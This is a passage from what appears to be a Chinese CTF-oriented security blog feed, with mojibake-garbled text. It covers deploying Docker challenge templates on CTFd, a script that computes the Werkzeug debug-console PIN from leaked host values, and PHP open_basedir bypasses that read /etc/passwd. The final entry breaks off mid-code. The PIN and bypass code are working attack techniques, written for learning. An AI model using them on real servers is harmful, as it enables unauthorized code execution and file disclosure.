<p>æ³¨æ„å¯†ç çš„è®¾ç½®ä¸€å®šè¦ç¬¦åˆå¤æ‚æ€§è¦æ±‚ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p>
<h1 id="åŠ¨æ€flagé¢˜ç›®éƒ¨ç½²"><a href="#åŠ¨æ€flagé¢˜ç›®éƒ¨ç½²" class="headerlink" title="åŠ¨æ€flagé¢˜ç›®éƒ¨ç½²"></a>åŠ¨æ€flagé¢˜ç›®éƒ¨ç½²</h1><p>æ¨¡æ¿é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/dr0n1/CTF_Docker_Template">https://github.com/dr0n1/CTF_Docker_Template</a></p>
<p>åŒ…å«pwnç³»åˆ—çš„ubuntu16ï¼Œubuntu18ï¼Œubuntu20ï¼Œubuntu22<br>webç³»åˆ—çš„phpï¼Œjavaï¼Œpythonï¼Œgoï¼Œmysql<br>miscï¼Œreverseç³»åˆ—çš„éƒ¨åˆ†åŠ¨æ€</p>
<p>å› ä¸ºä¸ä¼šcryptoï¼Œå°±æ²¡å†™äº¤äº’çš„crypto</p>
<h2 id="pwné¢˜éƒ¨ç½²"><a href="#pwné¢˜éƒ¨ç½²" class="headerlink" title="pwné¢˜éƒ¨ç½²"></a>pwné¢˜éƒ¨ç½²</h2><blockquote>
<p>åŒ…å«äº†<code>ubuntu16</code>ï¼Œ<code>ubuntu18</code>ï¼Œ<code>ubuntu20</code>ï¼Œ<code>ubuntu22</code>å››ä¸ªåŸºç¡€æ¨¡æ¿</p>
</blockquote>
<p>å‡è®¾ç°åœ¨å‡ºäº†ä¸€é“pwné¢˜ï¼Œåå­—æ˜¯baby_stack</p>
<p>é¦–å…ˆæ ¹æ®é¢˜ç›®é€‰æ‹©éœ€è¦çš„Ubuntuç‰ˆæœ¬ï¼Œè¿™é‡Œä»¥Ubuntu16ä¸ºä¾‹ï¼Œä¸‹è½½<code>pwn_ubuntu16</code>è¿™ä¸ªæ¨¡æ¿</p>
<p>æŠŠå‡ºå¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶æ”¾åˆ°binç›®å½•ä¸‹ï¼Œæ›¿æ¢<code>test</code><br>ç„¶åæ‰¾åˆ°<code>ctf.xinetd</code>æ–‡ä»¶ä¸­çš„<code>server_args</code>å€¼ï¼Œä¿®æ”¹<code>test</code>ä¸ºé™„ä»¶å</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-1.png"></p>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼Œæ„å»ºé•œåƒ<br>åœ¨<code>Dockerfile</code>æ‰€åœ¨çš„ç›®å½•è¿è¡Œ<code>docker build -t &lt;é•œåƒå&gt; .</code><br>è¿è¡Œåå¯ä»¥ç”¨<code>docker images</code>æŸ¥çœ‹ä¸‹æ˜¯å¦æˆåŠŸç”Ÿæˆäº†é•œåƒ</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-2.png"></p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼Œæœ¬åœ°æµ‹è¯•æˆ–CTFdéƒ¨ç½²</p>
<blockquote>
<p>æœ¬åœ°æµ‹è¯•è¿™æ­¥å¯é€‰ï¼Œæ²¡æœ‰ä¿¡å¿ƒä¸€æ¬¡æˆåŠŸçš„è¯å¯ä»¥å…ˆåœ¨æœ¬åœ°æµ‹è¯•ä¸‹</p>
</blockquote>
<p>è¿è¡Œ<code>docker run -itd -p &lt;å¯¹å¤–æš´éœ²ç«¯å£&gt;:9999 &lt;é•œåƒå&gt; /start.sh</code></p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-3.png"></p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-4.png"></p>
<p>ncè¿æ¥åèƒ½è¿”å›ç¨‹åºçš„åŠŸèƒ½å°±okäº†(åˆ«å¿˜è®°åˆ é™¤å®¹å™¨)<br>æ¥ç€åœ¨CTFdä¸Šéƒ¨ç½²ï¼Œæ³¨æ„typeé€‰æ‹©directï¼Œimageä¸portå¯¹åº”å³å¯</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-5.png"></p>
<h2 id="webé¢˜éƒ¨ç½²"><a href="#webé¢˜éƒ¨ç½²" class="headerlink" title="webé¢˜éƒ¨ç½²"></a>webé¢˜éƒ¨ç½²</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><blockquote>
<p>åŒ…å«äº†<code>web_apache-mysql-php5.4</code>ï¼Œ<code>web_apache-mysql-php7.3</code>ï¼Œ<code>web_apache-php5.4</code>ï¼Œ<code>web_apache-php7.3</code> å››ä¸ªphpæ¨¡æ¿ã€‚ï¼ˆå¦‚æœéœ€è¦å…¶ä»–ç‰ˆæœ¬çš„phpç¯å¢ƒï¼Œæ›¿æ¢Dockerfileä¸­çš„FROMå‘½ä»¤å³å¯ï¼‰</p>
</blockquote>
<p>1ï¼šå°†é¢˜ç›®æ”¾å…¥<code>src</code>ç›®å½•ä¸‹<br>2ï¼šå°†éœ€è¦å¯¼å…¥æ•°æ®åº“çš„æ•°æ®å†™å…¥<code>data</code>ç›®å½•ä¸‹çš„data.sql<br>3ï¼šæ ¹æ®é¢˜ç›®é€‰æ‹©flagä½ç½®ï¼Œç„¶åä¿®æ”¹<code>start.sh</code><br>4ï¼šdocker build</p>
<p>åœ¨sqlç¯å¢ƒä¸­æ³¨æ„æ›¿æ¢flagä½ç½®å³å¯ï¼ˆè¦ä¸€ä¸€å¯¹åº”ï¼‰</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-8.png"></p>
<p>å¦‚æœéœ€è¦ä½¿ç”¨phpæ‰©å±•ï¼Œåˆ™ä¿®æ”¹æˆ–å¢åŠ Dockerfileæ–‡ä»¶ä¸­çš„docker-php-ext-installå‘½ä»¤å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸºäºthinkphpç­‰æ¡†æ¶çš„æºç åˆ™éœ€è¦åœ¨start.shä¸­æ·»åŠ  æ›´æ”¹ç½‘é¡µæ ¹ç›®å½• çš„ä»£ç ï¼Œå¹¶æ ¹æ®æ‰‹å†Œå®‰è£…å¯¹åº”ä¾èµ–å’Œæ‹“å±•</span><br><span class="hljs-comment"># ä»…ä¾›å‚è€ƒ</span><br>sed -i <span class="hljs-string">&#x27;s/DocumentRoot \/var\/www\/html/DocumentRoot \/var\/www\/html\/public/&#x27;</span> /etc/apache2/sites-available/000-default.conf<br></code></pre></td></tr></table></figure>



<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><blockquote>
<p>åŒ…å«äº†<code>web_flask-python2.7</code>ï¼Œ<code>web_flask-python3.10</code> ä¸¤ä¸ªpythonæ¨¡æ¿</p>
</blockquote>
<p>1ï¼šsrcä¸­å­˜æ”¾é¢˜ç›®ä»£ç ï¼Œæ³¨æ„å‘½åapp.pyã€‚å¦‚æœä½¿ç”¨äº†é™¤flaskå¤–çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¯·åœ¨requirements.txtä¸­æ ‡æ˜<br>2ï¼šé»˜è®¤å¯åŠ¨æ—¶ä¸å¯ç”¨debugæ¨¡å¼ï¼Œå¦‚éœ€è¦å¯ç”¨debugæ¨¡å¼è¯·ä¿®æ”¹start.sh</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-9.png"></p>
<h2 id="miscé¢˜éƒ¨ç½²"><a href="#miscé¢˜éƒ¨ç½²" class="headerlink" title="miscé¢˜éƒ¨ç½²"></a>miscé¢˜éƒ¨ç½²</h2><blockquote>
<p>åŒ…å«äº†<code>misc_python2.7</code>ï¼Œ<code>misc_python3.9</code>ä¸¤ä¸ªé•œåƒæ¨¡æ¿ã€‚åˆ©ç”¨<code>http.server</code>ï¼Œ<code>SimpleHTTPServer</code>å’Œ<code>httpd</code>å¯åŠ¨ä¸€ä¸ªwebæœåŠ¡ç”¨æ¥ä¸‹è½½é™„ä»¶</p>
</blockquote>
<blockquote>
<p>ä¸ªäººè®¤ä¸ºåŠ¨æ€miscçš„æ ¸å¿ƒæ€è·¯å°±æ˜¯æŠŠå‡ºé¢˜è¿‡ç¨‹è½¬æ¢ä¸ºä¸€ä¸ªè„šæœ¬ï¼Œç„¶åè¯»å–å¹³å°ä¼ é€’çš„flagåç”Ÿæˆé™„ä»¶ï¼Œåˆ©ç”¨webæœåŠ¡ä¸‹è½½ã€‚æ‰€ä»¥éƒ¨åˆ†å·¥å…·é¢˜å’Œå¤æ‚ä¸€ç‚¹çš„é¢˜ç›®æ˜¯æ²¡æœ‰åŠæ³•å‡ºåŠ¨æ€çš„</p>
</blockquote>
<p>è¿˜æ˜¯å…ˆæ ¹æ®éœ€æ±‚é€‰æ‹©ä¸åŒçš„ç¯å¢ƒï¼Œè¿™é‡Œä»¥<code>misc_python3.9</code>ä¸ºä¾‹</p>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼Œå…ˆå°†å‡ºé¢˜æ€è·¯å†™è¿›ä¸€ä¸ªè„šæœ¬ä¸­ï¼Œå‘½åä¸º<code>challenges.py</code>ï¼Œæ‰€éœ€çš„æ¨¡å—æ”¾åˆ°<code>requirements.txt</code>ä¸­</p>
<p>è¿™ä¸ªè„šæœ¬æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š<br>1ï¼šéœ€è¦ä»<code>/flag</code>è¯»å–flagå€¼<br>2ï¼šå‡ºé¢˜åç”Ÿæˆçš„é™„ä»¶éœ€è¦å¥—ä¸€å±‚å‹ç¼©åŒ…ä»¥ä¾¿è®¿é—®è‡ªåŠ¨ä¸‹è½½ï¼Œzipéœ€è¦å‘½åä¸º<code>attachment.zip</code><br>3ï¼šå°½é‡åœ¨è„šæœ¬ç»“æŸæ—¶åˆ é™¤æ— ç”¨çš„æ–‡ä»¶</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pyminizip<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image,ImageDraw,ImageOps<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>flag=f.read()<br><br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">300</span>,<span class="hljs-number">20</span>))<br>w,h=a.size<br>d=ImageDraw.Draw(a)<br>d.text((<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),flag,fill=<span class="hljs-number">255</span>)<br>a = ImageOps.invert(a)<br>a.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br><br><br>password = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(<span class="hljs-string">&#x27;0123456789&#x27;</span>, k=<span class="hljs-number">8</span>))<br>pyminizip.compress(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;attachment.zip&quot;</span>, password, <span class="hljs-number">5</span>)<br>os.remove(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure>


<p><strong>ç¬¬äºŒæ­¥</strong>ï¼Œå°†ä»£ç æ”¾è¿›<code>files</code>ç›®å½•ï¼Œç„¶åç”Ÿæˆé•œåƒ</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-6.png"></p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼Œåœ¨CTFdä¸Šéƒ¨ç½²ï¼Œç„¶åéªŒè¯</p>
<p>éƒ¨ç½²æ—¶ç«¯å£é€‰æ‹©80</p>
<p>å¼€å¯é¶æœºåè®¿é—®ï¼Œå¦‚æœæ²¡å‡ºé—®é¢˜çš„è¯åº”è¯¥åªä¼šå¼¹å‡ºä¸€ä¸ªä¿å­˜æ–‡ä»¶çš„çª—å£ï¼Œä¸”èƒ½æˆåŠŸä¸‹è½½</p>
<p><img src="/img/%E9%A1%B9%E7%9B%AE/ctfd-template-7.png"></p>
<p>ä¸‹è½½åˆ°æœ¬åœ°åå°±å¯ä»¥æ­£å¸¸è§£é¢˜</p>
<h1 id="docker-in-qemu-in-docker"><a href="#docker-in-qemu-in-docker" class="headerlink" title="docker in qemu in docker"></a>docker in qemu in docker</h1><p>å¸¸è§äºdockeré€ƒé€¸é¢˜ç›®çš„éƒ¨ç½²<br>dockerï¼ˆdeployï¼‰-&gt; qemuï¼ˆflagï¼‰-&gt; dockerï¼ˆattackï¼‰</p>
<p>å¦‚æœç”¨äº†kvmåˆ™è¦æ³¨æ„kvmçš„æ˜ å°„</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><code class="hljs docker">docker build -t docker-escaper .<br>docker <span class="hljs-keyword">run</span><span class="language-bash"> -itd -p 5555:5555 --device /dev/kvm  -v /dev/kvm:/dev/kvm  docker-escaper</span><br></code></pre></td></tr></table></figure>

<p>æ²¡æœ‰kvmçš„è§£å†³æ–¹æ³•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ£€æŸ¥cpuæ˜¯å¦æ”¯æŒ</span><br>apt install cpu-check<br>kvm-ok<br><br><span class="hljs-comment"># å¦‚æœæ”¯æŒåˆ™å¯ä»¥ç»§ç»­</span><br>apt install qemu qemu-kvm libvirt-clients libvirt-daemon-system bridge-utils virt-manager libguestfs-tools<br>sudo systemctl <span class="hljs-built_in">enable</span> --now libvirtd<br>sudo systemctl <span class="hljs-built_in">enable</span> --now virtlogd<br><span class="hljs-built_in">echo</span> 1 | sudo <span class="hljs-built_in">tee</span> /sys/module/kvm/parameters/ignore_msrs<br>sudo modprobe kvm<br></code></pre></td></tr></table></figure>


<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä¸€å®šè¦çµæ´»ä½¿ç”¨dockerfileï¼Œä¸åŒé¢˜ç›®æ ¹æ®<strong>éœ€æ±‚</strong>åšä¸åŒç­–ç•¥</p>
]]></content>
      <categories>
        <category>é¡¹ç›®</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>misc</tag>
        <tag>ctfd</tag>
        <tag>pwn</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>flaskç®—pin</title>
    <url>/posts/564e35d3/</url>
    <content><![CDATA[<p>flaskåœ¨å¼€å¯debugæ¨¡å¼åä¼šå¯åŠ¨è°ƒè¯•æ¨¡å¼ï¼Œä¸€èˆ¬ä¸º<code>/console</code>ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥</p>
<p><strong>python3.8å’Œpython3.6ç”ŸæˆPINçš„ç®—æ³•ä¸åŒ</strong></p>
<p>ç®—æ³•ä»£ç åœ¨<code>site-packages/werkzeug/debug/__init__.py</code></p>
<h1 id="éœ€è¦çš„ä¿¡æ¯"><a href="#éœ€è¦çš„ä¿¡æ¯" class="headerlink" title="éœ€è¦çš„ä¿¡æ¯"></a>éœ€è¦çš„ä¿¡æ¯</h1><table>
<thead>
<tr>
<th></th>
<th>ä»£ç ä¸­</th>
<th>æ–‡ä»¶ä¸­</th>
</tr>
</thead>
<tbody><tr>
<td>username</td>
<td>getpass.getuser()</td>
<td>&#x2F;etc&#x2F;passwd</td>
</tr>
<tr>
<td>modname</td>
<td>getattr(mod, â€œ__file__â€œ, None)</td>
<td>é»˜è®¤å€¼ä¸ºflask.app</td>
</tr>
<tr>
<td>appname</td>
<td>getattr(app, â€œ__name__â€œ, type(app).__name__)</td>
<td>é»˜è®¤å€¼ä¸ºFlask</td>
</tr>
<tr>
<td>moddir</td>
<td>getattr(mod, â€œ__file__â€œ, None)</td>
<td>æŠ¥é”™è¯»å–</td>
</tr>
<tr>
<td>uuidnode</td>
<td>uuid.getnode()</td>
<td>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;addresså¾—åˆ°16è¿›åˆ¶ç»“æœï¼Œè½¬åŒ–ä¸º10è¿›åˆ¶è¿›è¡Œè®¡ç®—</td>
</tr>
<tr>
<td>machine_id</td>
<td>get_machine_id()</td>
<td>linuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etc&#x2F;machine-idæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_idï¼Œdockeré¶æœºåˆ™è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroupï¼Œå…¶ä¸­ç¬¬ä¸€è¡Œçš„&#x2F;docker&#x2F;å­—ç¬¦ä¸²åé¢çš„å†…å®¹ä½œä¸ºæœºå™¨çš„idï¼Œåœ¨dockerç¯å¢ƒä¸‹è¯»å–åä¸¤ä¸ªï¼Œédockerç¯å¢ƒä¸‰ä¸ªéƒ½éœ€è¦è¯»å–</td>
</tr>
</tbody></table>
<h1 id="3-6"><a href="#3-6" class="headerlink" title="3.6"></a>3.6</h1><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#MD5</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>     <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>     <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>     <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>     <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>     <span class="hljs-string">&#x27;25214234362297&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>     <span class="hljs-string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>   h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>   num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>   <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>          rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                      <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>          <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">else</span>:<br>          rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>




<h1 id="3-8"><a href="#3-8" class="headerlink" title="3.8"></a>3.8</h1><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sha1</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span><span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># é»˜è®¤å€¼</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># é»˜è®¤å€¼</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># æŠ¥é”™å¾—åˆ°</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377600896&#x27;</span>,<span class="hljs-comment">#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span><br>    <span class="hljs-comment">#machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br>    <span class="hljs-string">&#x27;225374fa-04bc-4346-9f39-48fa82829ca9a57bc49ae880a291711cb100aba12025c1e666fb86db4712f78c31ed557320c4&#x27;</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>flask</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>phpç»•è¿‡open_basedir</title>
    <url>/posts/3e5549a6/</url>
    <content><![CDATA[<p>open_basedirä¸€èˆ¬ç”¨æ¥é™åˆ¶è·¨ç›®å½•è¯»å†™æ–‡ä»¶</p>
<p>phpç»•è¿‡open_basediræ˜¯ä¸€ä¸ªå¤è€çš„æ¼æ´ï¼Œåœ¨2009å¹´å·¦å³å°±è¢«æå‡ºæ¥äº†</p>
<h1 id="glob-x2F-x2F"><a href="#glob-x2F-x2F" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h1><p>opendir()å‡½æ•°ä¸ºæ‰“å¼€ç›®å½•å¥æŸ„ï¼Œreaddir()å‡½æ•°ä¸ºä»ç›®å½•å¥æŸ„ä¸­è¯»å–æ¡ç›®ã€‚</p>
<p>è¿™é‡Œç»“åˆä¸¤ä¸ªå‡½æ•°æ¥åˆ—ä¸¾æ ¹ç›®å½•ä¸­çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;glob:///*&quot;</span>;<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨DirectoryIteratorçš„æ•ˆæœæ˜¯ä¸€æ ·çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span>=<span class="hljs-string">&quot;glob:///*&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


<p>å±€é™æ€§ï¼šä¸èƒ½åˆ—ä¸¾å‡ºå…¶ä»–éæ ¹ç›®å½•å’Œopen_basediræŒ‡å®šçš„ç›®å½•ä¸­çš„æ–‡ä»¶</p>
<h1 id="chdir-ä¸ini-set-ç»„åˆ"><a href="#chdir-ä¸ini-set-ç»„åˆ" class="headerlink" title="chdir()ä¸ini_set()ç»„åˆ"></a>chdir()ä¸ini_set()ç»„åˆ</h1><p>è¿™ç§åˆ©ç”¨æ–¹å¼è·Ÿopen_basedirå­˜åœ¨ç¼ºé™·çš„å¤„ç†é€»è¾‘æœ‰å…³</p>
<p>é€šè¿‡è·³è½¬å’Œè®¾ç½®open_basedirå®ç°ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><br><span class="hljs-comment">//var_dump(scandir(&#x27;/&#x27;));</span><br><span class="hljs-comment">//readfile(&#x27;/flag&#x27;);</span><br></code></pre></td></tr></table></figure>




<h1 id="symlink"><a href="#symlink" class="headerlink" title="symlink()"></a>symlink()</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span 